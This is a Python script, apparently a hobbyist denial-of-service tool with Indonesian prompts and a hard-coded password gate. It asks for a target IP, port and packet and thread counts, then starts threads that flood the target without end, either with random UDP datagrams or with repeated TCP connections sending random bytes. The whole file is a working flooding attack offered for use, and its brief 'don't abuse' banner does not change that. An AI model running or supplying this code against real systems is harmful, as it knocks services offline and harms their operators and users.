import random
import socket
import threading
import os
import sys

os.system("clear")
print("\033[93m")
Password = input("MAUSKAN PASSWORD: ")

if Password=="GAAA": 
    print(f"""
Password yang anda masukan Benar !!
    """) 
    print("""\033[91m
                  TOOLS BY GAAA
░██████╗░░█████╗░░█████╗░░█████╗░
██╔════╝░██╔══██╗██╔══██╗██╔══██╗
██║░░██╗░███████║███████║███████║
██║░░╚██╗██╔══██║██╔══██║██╔══██║
╚██████╔╝██║░░██║██║░░██║██║░░██║
░╚═════╝░╚═╝░░╚═╝╚═╝░░╚═╝╚═╝░░╚═╝""")

    print("\033[92m")
    print(" TOOLS BY : GAAA")
    print(" ###########################################")
    print(" | AUTOR   : GAAA                              ")
    print(" • CODE    : GAAA                      •")
    print(" | WARNIG:TOOLS INI JANGAN DI PAKEK ABUSE ")
    print(" • DISCORD : GAAA#3057                   •")
    print(" | MY TEAM : PM GAAA AJA BREE")
    print(" ###########################################")
    ip = str(input("  IP TARGET:"))
    port = int(input(" PORT TARGET:"))
    choice = str(input(" LANJUT UNTUK MENDDOS? (y/n):"))
    times = int(input(" BERAPA PAKET DIKIRIM:"))
    threads = int(input(" ISI SETIAP PAKET:"))
    
    def run():
        data = random._urandom(1025)
        i = random.choice(("[TOK!!!TOK!!!]","[TOK!!!TOK!!!]"))
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                addr = (str(ip),int(port))
                for x in range(times):
                    s.sendto(data,addr)
                print(i +"\033[92m PERMISI PAKET FROM GAAA !!! ")
            except:
                print("[!] PAKETNYA ENAK GAK NIH !!!")
    def run2():
        data = random._urandom(16)
        i = random.choice(("[TOK!!!TOK!!!]","[TOK!!!TOK!!!]","[#]"))
        while True:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((ip,port))
                s.send(data)
                for x in range(times):
                    s.send(data)
                print(i +" PERMISI PAKET FROM GAAA !!! ")
            except:
                s.close()
                print("[*] PAKETNYA ENAK GAK NIH !!!")
    for y in range(threads):
        if choice == 'y':
            th = threading.Thread(target = run)
            th.start()
        else:
            th = threading.Thread(target = run2)
            th.start()

else :
    print("Password anda salah Silahkan coba ulangi lagi nanti")

print("Added Tools By GAAA")
